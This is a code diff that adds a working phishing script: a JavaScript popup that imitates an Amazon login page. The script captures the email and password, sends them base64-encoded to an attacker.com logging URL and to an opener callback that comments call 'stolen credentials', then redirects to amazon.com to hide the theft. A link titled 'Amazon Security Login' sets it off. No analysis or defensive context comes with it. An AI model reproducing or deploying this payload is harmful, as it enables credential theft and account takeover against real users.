@@ -1,0 +1,58 @@
+<script>
+function advancedSpoof() {
+    const popup = window.open('about:blank', 'phish', 'width=600,height=400');
+    
+    // Phase 1: Set up interactive content quickly
+    const phishingPage = `
+        <html>
+        <body onload="document.getElementById('email').focus()">
+            <h2>Amazon Login</h2>
+            <form onsubmit="captureAndRedirect()">
+                <input type="email" id="email" required>
+                <input type="password" id="password" required>
+                <button>Continue</button>
+            </form>
+            <script>
+                function captureAndRedirect() {
+                    const creds = {
+                        email: document.getElementById('email').value,
+                        password: document.getElementById('password').value
+                    };
+                    // Try multiple methods to exfiltrate data
+                    try { window.opener.collectCreds(creds); } catch(e) {}
+                    try { new Image().src = 'https://attacker.com/log?data=' + btoa(JSON.stringify(creds)); } catch(e) {}
+                    return false;
+                }
+                
+                // Rapid focus to enable quick user input
+                setTimeout(() => {
+                    document.getElementById('email').focus();
+                }, 50);
+            <\/script>
+        </body>
+        </html>
+    `;
+    
+    popup.document.write(phishingPage);
+    
+    // Phase 2: Rapid redirect sequence
+    let redirectCount = 0;
+    const redirectSequence = setInterval(() => {
+        if (redirectCount === 0) {
+            popup.location.href = 'javascript:void(0)';
+        } else if (redirectCount === 2) {
+            popup.location.href = 'https://amazon.com';
+            clearInterval(redirectSequence);
+        }
+        redirectCount++;
+    }, 10);
+}
+
+// Global function to collect credentials
+window.collectCreds = function(creds) {
+    console.log('Collected:', creds);
+    // Process stolen credentials
+};
+</script>
+
+<a href="#" onclick="advancedSpoof()">Amazon Security Login</a>
